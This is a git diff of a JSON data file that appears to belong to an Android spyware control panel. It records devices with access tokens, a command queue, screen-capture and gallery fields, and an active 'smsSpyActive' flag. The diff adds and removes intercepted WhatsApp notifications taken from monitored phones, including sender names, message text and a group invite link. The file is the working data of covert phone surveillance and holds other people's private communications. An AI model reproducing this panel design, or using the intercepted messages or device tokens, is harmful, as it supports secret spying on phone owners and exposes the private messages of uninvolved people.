@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046116196,
+    "lastSeen": 1775046131214,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13584 pesan): ~ cewek bauti 👅☝🏻",
+        "content": "nenek kebingungan",
+        "time": "01/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046133039
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13583 pesan): ~ Bot",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045412295
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (92 pesan): ~ WINZX [3648]",
-        "content": "🔗 22 FEE 3K K PP 9K | https://chat.whatsapp.com/CLRXqFJ9YbrGmt7YNUrRaF?mode=gi_t\n\n-1 geseran gc",
-        "time": "01/04 20:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045412139
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775046117911,
+    "lastSeen": 1775046132920,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
